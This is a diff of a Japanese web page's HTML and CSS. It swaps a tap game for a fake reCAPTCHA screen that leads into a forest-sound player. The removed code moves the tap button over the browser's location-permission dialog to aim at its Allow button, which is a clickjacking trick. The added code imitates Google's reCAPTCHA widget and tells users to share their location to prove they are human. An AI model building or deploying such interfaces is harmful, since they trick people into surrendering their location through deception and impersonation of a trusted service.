@@ -2,895 +2,1581 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
-    <title>30秒連打マスター - 30 SEC TAP MASTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA - 位置情報確認</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            background-color: #f9f9f9;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+            -webkit-user-select: none;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ===== reCAPTCHA ステージ ===== */
+        .recaptcha-stage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f9f9f9;
+            z-index: 5000;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+
+        .recaptcha-stage.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .recaptcha-widget {
+            width: 304px;
+            height: 78px;
+            background-color: #ffffff;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            position: relative;
+            transition: box-shadow 0.2s ease, border-color 0.2s ease;
+        }
+
+        .recaptcha-widget:hover {
+            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .recaptcha-left-section {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            height: 100%;
+            flex-grow: 1;
+        }
+
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+            position: relative;
+            margin-right: 12px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox-box {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: #f9f9f9;
+            transition: border-color 0.15s ease, background-color 0.15s ease;
+            box-sizing: border-box;
+        }
+
+        .recaptcha-left-section:hover .checkbox-box {
+            border-color: #b2b2b2;
+        }
+
+        .spinner-svg {
+            position: absolute;
+            width: 32px;
+            height: 32px;
+            animation: recaptcha-rotate 1.2s linear infinite;
+            display: none;
+        }
+
+        @keyframes recaptcha-rotate {
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner-svg circle {
+            stroke: #1A73E8;
+            stroke-dasharray: 89, 200;
+            stroke-dashoffset: 0;
+            stroke-linecap: round;
+        }
+
+        .checkmark-svg {
+            position: absolute;
+            width: 38px;
+            height: 38px;
+            display: none;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.2s ease;
+        }
+
+        .checkmark-svg.checked {
+            display: block;
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .checkmark-path {
+            stroke: #098842;
+            stroke-width: 3.2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            stroke-dasharray: 40;
+            stroke-dashoffset: 40;
+            animation: draw-check 0.35s ease-in-out 0.05s forwards;
+        }
+
+        @keyframes draw-check {
+            to { stroke-dashoffset: 0; }
+        }
+
+        .recaptcha-label {
+            font-size: 14px;
+            color: #222222;
+            font-weight: 400;
+            letter-spacing: -0.1px;
+            line-height: 1.2;
+        }
+
+        .recaptcha-right-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            padding-left: 6px;
+            flex-shrink: 0;
+            width: 62px;
+        }
+
+        .brand-logo-svg {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 1px;
+        }
+
+        .brand-name {
+            font-size: 10px;
+            color: #555555;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+            line-height: 1;
+        }
+
+        .brand-legal-links {
+            font-size: 8px;
+            color: #555555;
+            display: flex;
+            gap: 2px;
+            margin-top: 3px;
+            white-space: nowrap;
+        }
+
+        .brand-legal-links a {
+            color: #555555;
+            text-decoration: none;
+        }
+
+        .brand-legal-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== 位置情報モーダル ===== */
+        .geo-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 6000;
+            opacity: 0;
+            transition: opacity 0.25s ease;
+            pointer-events: none;
+        }
+
+        .geo-modal-overlay.active {
+            display: flex;
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .geo-modal-card {
+            background: #ffffff;
+            width: 360px;
+            max-width: 90vw;
+            border-radius: 0;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
+            padding: 32px 24px 28px;
+            text-align: center;
+            transform: scale(0.9);
+            transition: transform 0.25s ease;
+            border: 1px solid #d3d3d3;
+        }
+
+        .geo-modal-overlay.active .geo-modal-card {
+            transform: scale(1);
+        }
+
+        .geo-icon-svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 14px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .geo-icon-svg circle { fill: #1A73E8; }
+        .geo-icon-svg path { fill: #ffffff; }
+
+        .geo-modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .geo-modal-desc {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .geo-modal-progress {
+            margin-top: 16px;
+            width: 100%;
+            height: 4px;
+            background: #e8eaed;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .geo-modal-progress::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 40%;
+            background: #1A73E8;
+            animation: progress-slide 1.2s ease-in-out infinite;
+        }
+
+        @keyframes progress-slide {
+            0% { left: -40%; }
+            100% { left: 100%; }
+        }
+
+        /* どんぐり最強 表示 */
+        .donguri-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            font-size: 56px;
+            font-weight: 900;
+            color: #2e7d32;
+            text-shadow: 4px 4px 0 #a5d6a7, 0 0 30px rgba(46, 125, 50, 0.3);
+            letter-spacing: 4px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 7000;
+            transition: opacity 0.6s cubic-bezier(0.23, 1, 0.32, 1), transform 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+            white-space: nowrap;
+            background: linear-gradient(145deg, #f1f8e9, #ffffff);
+            padding: 20px 48px;
+            border-radius: 0;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+            border: 2px solid #2e7d32;
+        }
+
+        .donguri-message.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        /* ===== 森の音プレイヤー ステージ ===== */
+        .forest-stage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+            background-color: #0d2018;
+            z-index: 4000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 1s ease, visibility 1s ease;
+            font-family: 'Zen Maru Gothic', sans-serif;
+            color: #f0f7f4;
+        }
+
+        .forest-stage.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .forest-stage * {
+            box-sizing: border-box;
+        }
+    </style>
+
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@600;700&family=M+PLUS+Rounded+1c:wght@700;900&display=swap" rel="stylesheet">
-    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zen+Maru+Gothic:wght@400;500;700;900&family=Yuji+Syuku&display=swap" rel="stylesheet">
+
     <script>
         tailwind.config = {
             theme: {
                 extend: {
-                    fontFamily: {
-                        teko: ['Teko', 'sans-serif'],
-                        mplus: ['"M PLUS Rounded 1c"', 'sans-serif'],
-                    },
                     colors: {
-                        neonCyan: '#00f3ff',
-                        neonPink: '#ff007f',
-                        neonGold: '#ffd700',
-                        neonPurple: '#a855f7',
-                        darkBg: '#08090d',
+                        forest: {
+                            50: '#f0f7f4', 100: '#dbede5', 200: '#b9dbc8', 300: '#8ec2a6',
+                            400: '#60a481', 500: '#3e8863', 600: '#2d6d4d', 700: '#24573f',
+                            800: '#1e4634', 900: '#193a2c', 950: '#0d2018',
+                        },
+                        amberWood: {
+                            100: '#fdf6ed', 200: '#f9e8d3', 500: '#d99b53',
+                            700: '#996023', 900: '#52300b',
+                        }
                     },
+                    fontFamily: {
+                        maru: ['"Zen Maru Gothic"', 'sans-serif'],
+                        yuji: ['"Yuji Syuku"', 'serif'],
+                    }
                 }
             }
         }
     </script>
-    
+
     <style>
-        * { -webkit-tap-highlight-color: transparent; }
-
-        html, body {
-            background-color: #08090d;
-            color: #ffffff;
-            touch-action: manipulation;
+        .forest-stage body,
+        .forest-stage {
+            font-family: 'Zen Maru Gothic', sans-serif;
             user-select: none;
-            -webkit-user-select: none;
-            -webkit-touch-callout: none;
-            overflow: hidden;
-            overscroll-behavior: none;
-            height: 100%;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .glow-cyan {
-            box-shadow: 0 0 25px rgba(0, 243, 255, 0.6), inset 0 0 20px rgba(0, 243, 255, 0.4);
-            text-shadow: 0 0 12px rgba(0, 243, 255, 0.8);
-        }
-        .glow-pink {
-            box-shadow: 0 0 35px rgba(255, 0, 127, 0.8), inset 0 0 25px rgba(255, 0, 127, 0.6);
-            text-shadow: 0 0 15px rgba(255, 0, 127, 0.9);
-        }
-        .glow-gold {
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.9), inset 0 0 30px rgba(255, 215, 0, 0.7);
-            text-shadow: 0 0 18px rgba(255, 215, 0, 1);
+        .forest-stage .glass-card {
+            background: rgba(20, 42, 32, 0.65);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.12);
         }
 
-        .tap-btn {
-            transition: transform 0.05s cubic-bezier(0.1, 0.9, 0.2, 1), box-shadow 0.15s;
-            will-change: transform;
+        .forest-stage .glass-card-light {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .forest-stage .glass-panel {
+            background: rgba(13, 32, 24, 0.85);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .forest-stage input[type=range] {
+            -webkit-appearance: none;
+            background: transparent;
+        }
+        .forest-stage input[type=range]:focus { outline: none; }
+        .forest-stage input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 6px;
             cursor: pointer;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 9999px;
         }
-        .tap-btn.active-press { transform: scale(0.94) !important; }
-
-        /* ============================================
-           タップボタンの位置を制御するためのコンテナ
-           位置情報許可ダイアログと重なる位置へ移動させる
-           ============================================ */
-        #tapWrapper {
-            position: fixed;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            transition: top 0.35s cubic-bezier(0.4, 0, 0.2, 1),
-                        transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-            z-index: 25;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            pointer-events: none;
-        }
-
-        /* ダイアログ位置に移動した時の状態（許可ボタンを狙う） */
-        #tapWrapper.dialog-position {
-            top: 42%;   /* ブラウザダイアログの許可ボタン付近 */
-        }
-
-        /* ヒント吹き出し */
-        #permissionHint {
-            position: fixed;
-            left: 50%;
-            top: 12%;
-            transform: translateX(-50%);
-            z-index: 70;
-            padding: 10px 16px;
-            border-radius: 999px;
-            background: linear-gradient(90deg, #ff007f, #a855f7, #00f3ff);
-            color: #fff;
-            font-size: 11px;
-            font-weight: 900;
-            letter-spacing: 0.05em;
-            box-shadow: 0 0 24px rgba(255, 0, 127, 0.7);
-            animation: hintPulse 1.4s ease-in-out infinite;
-            pointer-events: none;
-            text-align: center;
-            max-width: 90vw;
-        }
-        @keyframes hintPulse {
-            0%, 100% { transform: translateX(-50%) scale(1); }
-            50% { transform: translateX(-50%) scale(1.05); }
-        }
-        #permissionHint.hidden { display: none; }
-
-        #particleCanvas {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            pointer-events: none;
-            z-index: 10;
-        }
-
-        .float-text {
-            position: fixed;
-            pointer-events: none;
-            font-weight: 900;
-            font-family: 'Teko', sans-serif;
-            animation: floatUp 0.65s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
-            z-index: 50;
-        }
-        @keyframes floatUp {
-            0% { opacity: 1; transform: translate(-50%, -50%) scale(0.7); }
-            50% { transform: translate(-50%, -110%) scale(1.4) rotate(-6deg); }
-            100% { opacity: 0; transform: translate(-50%, -180%) scale(1) rotate(6deg); }
-        }
-
-        .shake { animation: shakeAnim 0.12s ease-in-out infinite; }
-        @keyframes shakeAnim {
-            0% { transform: translate(0, 0); }
-            25% { transform: translate(-5px, 5px); }
-            50% { transform: translate(5px, -4px); }
-            75% { transform: translate(-4px, -3px); }
-            100% { transform: translate(0, 0); }
-        }
-
-        .ripple {
-            position: fixed;
+        .forest-stage input[type=range]::-webkit-slider-thumb {
+            height: 18px;
+            width: 18px;
             border-radius: 50%;
-            pointer-events: none;
-            background: radial-gradient(circle, rgba(0,243,255,0.6) 0%, rgba(0,243,255,0) 70%);
-            transform: translate(-50%, -50%);
-            animation: rippleAnim 0.5s ease-out forwards;
-            z-index: 40;
+            background: #60a481;
+            cursor: pointer;
+            -webkit-appearance: none;
+            margin-top: -6px;
+            box-shadow: 0 0 10px rgba(96, 164, 129, 0.6);
+            transition: transform 0.1s ease, background-color 0.2s;
         }
-        @keyframes rippleAnim {
-            0%   { width: 0; height: 0; opacity: 1; }
-            100% { width: 200px; height: 200px; opacity: 0; }
+        .forest-stage input[type=range]::-webkit-slider-thumb:hover {
+            transform: scale(1.2);
+            background: #8ec2a6;
+        }
+
+        .forest-stage ::-webkit-scrollbar { width: 6px; height: 6px; }
+        .forest-stage ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }
+        .forest-stage ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+        }
+        .forest-stage ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        #bgCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 0;
+            pointer-events: none;
         }
     </style>
 </head>
-<body class="font-mplus flex flex-col h-screen justify-between items-center relative select-none">
+<body>
 
-    <canvas id="particleCanvas"></canvas>
-    <div id="hitLayer" style="position:fixed;inset:0;z-index:15;cursor:pointer;"></div>
-
-    <!-- 位置情報許可待ちのヒント -->
-    <div id="permissionHint" class="hidden">
-        👆 位置情報の許可をお願いします
-    </div>
-
-    <!-- Header Navigation -->
-    <header class="w-full max-w-md px-5 pt-4 flex justify-between items-center z-30 relative pointer-events-none">
-        <div class="flex items-center gap-2">
-            <i class="fa-solid fa-bolt text-neonGold text-2xl animate-pulse"></i>
-            <h1 class="font-teko text-3xl font-bold tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-neonCyan via-neonPink to-neonGold">
-                30s TAP MASTER
-            </h1>
-        </div>
-        <button id="soundToggle" class="pointer-events-auto w-10 h-10 rounded-full bg-slate-800/80 border border-slate-700 flex items-center justify-center text-neonCyan hover:bg-slate-700 transition active:scale-95">
-            <i class="fa-solid fa-volume-high" id="soundIcon"></i>
-        </button>
-    </header>
-
-    <main class="w-full max-w-md flex-1 flex flex-col items-center justify-between p-4 z-20 relative pointer-events-none">
-
-        <!-- Live Score Board -->
-        <div class="w-full bg-slate-900/90 backdrop-blur-md rounded-2xl p-4 border border-slate-800 shadow-2xl flex justify-around items-center">
-            <div class="text-center">
-                <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">TIME LEFT</div>
-                <div id="timeDisplay" class="font-teko text-5xl font-bold text-neonCyan leading-none">30.0<span class="text-lg">s</span></div>
+    <!-- ===== reCAPTCHA ステージ ===== -->
+    <div class="recaptcha-stage" id="recaptchaStage">
+        <div class="recaptcha-widget">
+            <div class="recaptcha-left-section" id="recaptchaTrigger">
+                <div class="checkbox-container">
+                    <div class="checkbox-box" id="checkboxBox"></div>
+                    <svg class="spinner-svg" id="spinnerSvg" viewBox="0 0 50 50">
+                        <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
+                    </svg>
+                    <svg class="checkmark-svg" id="checkmarkSvg" viewBox="0 0 36 36">
+                        <path class="checkmark-path" fill="none" d="M8 18 L15 25 L28 11"></path>
+                    </svg>
+                </div>
+                <span class="recaptcha-label">私はロボットではありません</span>
             </div>
-            <div class="h-10 w-px bg-slate-800"></div>
-            <div class="text-center">
-                <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">TOTAL TAPS</div>
-                <div id="scoreDisplay" class="font-teko text-5xl font-bold text-white leading-none">0</div>
+            <div class="recaptcha-right-section">
+                <svg class="brand-logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M 50 15 A 35 35 0 0 1 82 38 L 90 30 L 86 52 L 64 48 L 73 40 A 26 26 0 0 0 50 23 Z" fill="#4285F4"/>
+                    <path d="M 82 58 A 35 35 0 0 1 32 82 L 38 90 L 16 86 L 20 64 L 28 73 A 26 26 0 0 0 74 54 Z" fill="#1A73E8"/>
+                    <path d="M 24 70 A 35 35 0 0 1 32 20 L 26 12 L 48 16 L 44 38 L 35 29 A 26 26 0 0 0 28 62 Z" fill="#9AA0A6"/>
+                </svg>
+                <span class="brand-name">reCAPTCHA</span>
+                <div class="brand-legal-links">
+                    <a href="#" onclick="event.preventDefault();">プライバシー</a>
+                    <span>-</span>
+                    <a href="#" onclick="event.preventDefault();">利用規約</a>
+                </div>
             </div>
-            <div class="h-10 w-px bg-slate-800"></div>
-            <div class="text-center">
-                <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">REAL-TIME CPS</div>
-                <div id="cpsDisplay" class="font-teko text-5xl font-bold text-neonGold leading-none">0.0</div>
-            </div>
-        </div>
-
-        <!-- Combo & Fever -->
-        <div class="h-14 flex flex-col justify-center items-center my-1">
-            <div id="comboBadge" class="hidden transform transition-all duration-100 scale-90">
-                <span class="font-teko text-4xl font-extrabold italic tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-neonGold via-orange-400 to-neonPink drop-shadow">
-                    <span id="comboCount">0</span> COMBO!
-                </span>
-            </div>
-            <div id="feverBadge" class="hidden animate-pulse">
-                <span class="px-4 py-1.5 bg-gradient-to-r from-neonPink via-purple-600 to-neonCyan text-white text-xs font-black rounded-full uppercase tracking-widest shadow-lg glow-pink">
-                    🔥 FEVER MODE (DOUBLE POINTS) 🔥
-                </span>
-            </div>
-        </div>
-
-        <!-- MAIN TAP CORE (position:fixed wrapper inside) -->
-        <div class="my-auto w-full" style="height: 260px;"></div>
-
-        <!-- Instructions / Controls -->
-        <div id="bottomControls" class="w-full text-center mt-3 pointer-events-auto">
-            <p id="hintText" class="text-xs text-slate-400 font-bold">
-                <i class="fa-solid fa-mobile-screen mr-1"></i>画面のどこをタップしても連打OK！PCはスペースキー対応
-            </p>
-            <button id="resetBtn" class="hidden mt-2 px-4 py-1.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-300 text-xs font-bold rounded-full transition pointer-events-auto">
-                <i class="fa-solid fa-rotate-left mr-1"></i>リセットしてやり直す
-            </button>
-        </div>
-
-    </main>
-
-    <!-- タップボタン本体（fixed wrapper で位置制御） -->
-    <div id="tapWrapper">
-        <div class="relative flex items-center justify-center">
-            <div id="orbRing1" class="absolute w-64 h-64 md:w-72 md:h-72 rounded-full border-2 border-neonCyan/30 animate-ping opacity-20"></div>
-            <div id="orbRing2" class="absolute w-56 h-56 md:w-64 md:h-64 rounded-full border border-neonPink/40"></div>
-
-            <button id="tapBtn" class="tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none">
-                <i id="orbIcon" class="fa-solid fa-hand-pointer text-5xl md:text-6xl text-white mb-2 drop-shadow-md"></i>
-                <span id="tapText" class="font-teko text-3xl md:text-4xl font-bold tracking-widest text-cyan-100 drop-shadow leading-none">
-                    START TAP!
-                </span>
-                <span id="subTapText" class="text-xs text-cyan-200/80 font-bold mt-1">画面のどこでもタップ！</span>
-            </button>
         </div>
     </div>
 
-    <!-- RESULT MODAL -->
-    <div id="resultModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[80] flex items-center justify-center p-4 hidden">
-        <div class="bg-slate-900 border-2 border-neonCyan/80 rounded-3xl p-6 w-full max-w-sm text-center relative shadow-2xl">
-            <div id="rankBadge" class="inline-block px-4 py-1 rounded-full bg-neonPink text-white font-black text-xs uppercase tracking-widest mb-3 shadow-lg glow-pink">
-                RANK: 連打の神
+    <!-- ===== 位置情報共有モーダル ===== -->
+    <div class="geo-modal-overlay" id="geoModalOverlay">
+        <div class="geo-modal-card">
+            <svg class="geo-icon-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="12" fill="#1A73E8"/>
+                <path d="M12 5 C9.79 5 8 6.79 8 9 C8 11.5 12 17 12 17 C12 17 16 11.5 16 9 C16 6.79 14.21 5 12 5 Z M12 10.5 C11.17 10.5 10.5 9.83 10.5 9 C10.5 8.17 11.17 7.5 12 7.5 C12.83 7.5 13.5 8.17 13.5 9 C13.5 9.83 12.83 10.5 12 10.5 Z" fill="#ffffff"/>
+            </svg>
+            <div class="geo-modal-title">位置情報の共有</div>
+            <div class="geo-modal-desc">
+                ロボットではないことを証明するために、位置情報を共有してください。
             </div>
-
-            <h2 class="font-teko text-5xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-neonCyan via-white to-neonGold leading-none mb-1">
-                FINISH!
-            </h2>
-            <p class="text-xs text-slate-400 mb-5 font-bold">30秒間の連打測定結果</p>
-
-            <div class="grid grid-cols-2 gap-3 mb-5">
-                <div class="bg-slate-800/80 p-3 rounded-2xl border border-slate-700/80">
-                    <div class="text-[10px] text-slate-400 font-bold">総タップ数</div>
-                    <div id="resTotalHits" class="font-teko text-4xl font-bold text-white leading-none">0</div>
-                    <div class="text-[9px] text-slate-500">Taps</div>
-                </div>
-                <div class="bg-slate-800/80 p-3 rounded-2xl border border-slate-700/80">
-                    <div class="text-[10px] text-slate-400 font-bold">平均 CPS</div>
-                    <div id="resAvgCps" class="font-teko text-4xl font-bold text-neonGold leading-none">0.0</div>
-                    <div class="text-[9px] text-slate-500">Taps / Sec</div>
-                </div>
-                <div class="bg-slate-800/80 p-3 rounded-2xl border border-slate-700/80">
-                    <div class="text-[10px] text-slate-400 font-bold">最高 CPS</div>
-                    <div id="resPeakCps" class="font-teko text-3xl font-bold text-neonCyan leading-none">0.0</div>
-                    <div class="text-[9px] text-slate-500">Max Speed</div>
-                </div>
-                <div class="bg-slate-800/80 p-3 rounded-2xl border border-slate-700/80">
-                    <div class="text-[10px] text-slate-400 font-bold">最大コンボ</div>
-                    <div id="resMaxCombo" class="font-teko text-3xl font-bold text-neonPink leading-none">0</div>
-                    <div class="text-[9px] text-slate-500">Combo</div>
-                </div>
+            <div class="geo-modal-progress"></div>
+            <div style="font-size:12px;color:#80868b;line-height:1.4;margin-top:12px;">
+                まもなく位置情報の許可ダイアログが表示されます。
             </div>
+        </div>
+    </div>
 
-            <div id="newRecordNotice" class="hidden mb-4 py-2 px-3 bg-neonGold/20 border border-neonGold text-neonGold rounded-xl text-xs font-bold animate-pulse">
-                🏆 自己最高記録を更新しました！
-            </div>
+    <!-- ===== どんぐり最強 表示 ===== -->
+    <div class="donguri-message" id="donguriMessage">どんぐり最強</div>
 
-            <div class="flex gap-2">
-                <button id="shareBtn" class="flex-1 py-3 bg-slate-800 hover:bg-slate-700 border border-slate-600 rounded-xl font-bold text-xs text-white transition flex items-center justify-center gap-1.5">
-                    <i class="fa-brands fa-x-twitter text-sm"></i> Xで共有
-                </button>
-                <button id="retryBtn" class="flex-1 py-3 bg-gradient-to-r from-neonCyan to-blue-600 hover:from-cyan-400 hover:to-blue-500 rounded-xl font-black text-xs text-slate-950 transition flex items-center justify-center gap-1">
-                    <i class="fa-solid fa-rotate-right text-sm"></i> もう一度挑戦
-                </button>
+    <!-- ===== 森の音プレイヤー ステージ ===== -->
+    <div class="forest-stage" id="forestStage">
+        <canvas id="bgCanvas"></canvas>
+
+        <div class="relative z-10 flex flex-col min-h-screen">
+
+            <header class="p-4 sm:p-6 max-w-7xl mx-auto w-full flex flex-col sm:flex-row items-center justify-between gap-4 border-b border-white/10 glass-card-light rounded-b-3xl">
+                <div class="flex items-center gap-3">
+                    <div class="w-12 h-12 rounded-2xl bg-forest-600/80 border border-forest-400/30 flex items-center justify-center text-amber-300 shadow-lg shadow-forest-900/50">
+                        <i data-lucide="trees" class="w-7 h-7"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-xl sm:text-2xl font-bold font-yuji tracking-wider text-white flex items-center gap-2">
+                            森の音 <span class="text-xs px-2 py-0.5 rounded-full bg-forest-500/30 text-forest-200 border border-forest-400/30 font-sans">Master Edition</span>
+                        </h1>
+                        <p class="text-xs text-forest-200/80">心身を癒やす自然環境音 ＆ ノイズジェネレーター</p>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-1.5 overflow-x-auto max-w-full pb-1 sm:pb-0 px-2 py-1 rounded-2xl bg-black/30 border border-white/10">
+                    <button onclick="setScene('morning')" id="sceneBtn-morning" class="scene-btn px-3 py-1.5 rounded-xl text-xs font-medium flex items-center gap-1.5 transition text-white/70 hover:text-white">
+                        <i data-lucide="sun" class="w-3.5 h-3.5 text-amber-400"></i> 木漏れ日の朝
+                    </button>
+                    <button onclick="setScene('rain')" id="sceneBtn-rain" class="scene-btn px-3 py-1.5 rounded-xl text-xs font-medium flex items-center gap-1.5 transition text-white/70 hover:text-white">
+                        <i data-lucide="cloud-rain" class="w-3.5 h-3.5 text-blue-400"></i> 雨の樹海
+                    </button>
+                    <button onclick="setScene('sunset')" id="sceneBtn-sunset" class="scene-btn px-3 py-1.5 rounded-xl text-xs font-medium flex items-center gap-1.5 transition text-white/70 hover:text-white">
+                        <i data-lucide="sunset" class="w-3.5 h-3.5 text-orange-400"></i> 夕暮れの湖畔
+                    </button>
+                    <button onclick="setScene('night')" id="sceneBtn-night" class="scene-btn px-3 py-1.5 rounded-xl text-xs font-medium flex items-center gap-1.5 transition text-white/70 hover:text-white">
+                        <i data-lucide="moon" class="w-3.5 h-3.5 text-indigo-300"></i> 星降る夜森
+                    </button>
+                    <button onclick="setScene('fog')" id="sceneBtn-fog" class="scene-btn px-3 py-1.5 rounded-xl text-xs font-medium flex items-center gap-1.5 transition text-white/70 hover:text-white">
+                        <i data-lucide="cloud-fog" class="w-3.5 h-3.5 text-emerald-300"></i> 幻想の霧森
+                    </button>
+                </div>
+            </header>
+
+            <main class="max-w-7xl mx-auto w-full p-4 sm:p-6 my-4 flex-1 grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+                <div class="lg:col-span-4 space-y-6">
+                    <div class="glass-card rounded-3xl p-5 space-y-4 shadow-xl">
+                        <div class="flex items-center justify-between border-b border-white/10 pb-3">
+                            <div class="flex items-center gap-2">
+                                <i data-lucide="sparkles" class="w-5 h-5 text-amber-300"></i>
+                                <h2 class="font-bold text-sm tracking-wide text-white">ムード・プリセット</h2>
+                            </div>
+                            <button onclick="openSavePresetModal()" class="text-xs bg-forest-600/50 hover:bg-forest-500 border border-forest-400/40 text-forest-100 px-2.5 py-1 rounded-lg transition flex items-center gap-1">
+                                <i data-lucide="bookmark-plus" class="w-3.5 h-3.5"></i> 現在の音を保存
+                            </button>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2" id="presetButtonsContainer"></div>
+                        <div id="customPresetsSection" class="pt-2 border-t border-white/10 hidden">
+                            <span class="text-[11px] font-bold text-forest-200/60 block mb-2">保存したマイ・ミックス</span>
+                            <div class="space-y-1.5" id="customPresetsList"></div>
+                        </div>
+                    </div>
+
+                    <div class="glass-card rounded-3xl p-5 space-y-4 shadow-xl">
+                        <div class="flex items-center justify-between border-b border-white/10 pb-3">
+                            <div class="flex items-center gap-2">
+                                <i data-lucide="activity" class="w-5 h-5 text-emerald-400"></i>
+                                <h2 class="font-bold text-sm tracking-wide text-white">バイノーラルビート (脳波トーン)</h2>
+                            </div>
